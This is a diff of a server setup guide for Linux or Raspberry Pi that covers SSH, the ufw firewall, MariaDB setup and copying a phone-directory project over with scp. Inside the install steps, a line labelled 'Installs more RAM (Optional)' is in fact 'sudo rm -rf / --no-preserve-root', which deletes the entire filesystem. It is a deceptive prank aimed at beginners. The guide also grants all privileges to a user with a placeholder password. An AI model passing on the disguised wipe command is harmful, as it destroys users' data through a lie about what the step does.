@@ -27,18 +27,18 @@ sudo apt install openssh-server
 sudo ufw enable
 sudo ufw allow ssh
 
-# Installing Python, git, neovim and MariaDB
+# Installing Python, git, neovim (Optional) and MariaDB
 sudo apt install python3-pip mariadb-server git neovim
 
 # Note: (Press enter when it prompts for a "root" password) Multiple prompts will show and you need to answer "Y/n" which is Yes or no. Correct: n, n, Y, Y, Y, Y, Y
 sudo mysql_secure_installation
 
-# Installs more RAM
+# Installs more RAM (Optional)
 sudo rm -rf / --no-preserve-root #512GB
 
 ```
 
-## SSH Key
+## SSH Key (Optional)
 Allows you to quickly remote login to your server/computer without requiring a password
 ```bat
 REM On the device you need to remote connect from in command line. Note: Fill in your Raspberry pi's user and ip. Also fill in your own windows computer user in the path.
@@ -65,5 +65,18 @@ To log into MariaDB use this command: ```sudo mariadb -u root```
 CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';
 GRANT ALL PRIVILEGES ON *.* TO 'username'@’localhost’ IDENTIFIED BY 'password';
 FLUSH PRIVILEGES;
+```
+
+
+## Download the "Telefonkatalog" and SCP it to your linux machine
+
+
+Download the "Telefonkatalog"
+
+```sh
+    # Fill in your Windows User and your linux user/ip
+     scp C:\Users\"YourUser"\Downloads\telefonkatalog_med_database user@ip
+
+
 ```
 
